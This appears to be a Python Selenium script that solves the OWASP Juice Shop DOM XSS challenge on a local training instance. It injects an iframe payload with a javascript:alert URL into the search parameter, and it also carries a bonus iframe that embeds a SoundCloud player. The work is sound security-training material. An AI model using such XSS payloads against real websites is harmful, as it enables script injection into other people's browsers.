import time
import urllib.parse

from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver import Firefox
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By

XPATH_banner_dismiss_btn = ".//button[@aria-label='Close Welcome Banner']"
XPATH_search_btn = ".//mat-icon[2]"
XPATH_search_field = ".//mat-search-bar/mat-form-field"

XSS_Payload = '<iframe src="javascript:alert(`xss`)">'
XSS_Payload_Bonus = """
<iframe 
width="100%" height="166"
scrolling="no" frameborder="no"
allow="autoplay"
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
</iframe>
"""

url_search = 'http://localhost:3000/#/search?q='
service = Service(r"/home/cyberian/PycharmProjects/owasp-juiceshop-solutions/geckodriver")
driver = Firefox(service)
driver.maximize_window()

driver.get(url_search + urllib.parse.quote(XSS_Payload))
# driver.get(url_search + urllib.parse.quote(XSS_Payload_Bonus))

driver.implicitly_wait(5)
driver.find_element(by=By.XPATH, value=XPATH_banner_dismiss_btn).click()

time.sleep(5)

try:
    driver.switch_to.alert.accept()
except NoAlertPresentException:
    time.sleep(5)
finally:
    driver.close()
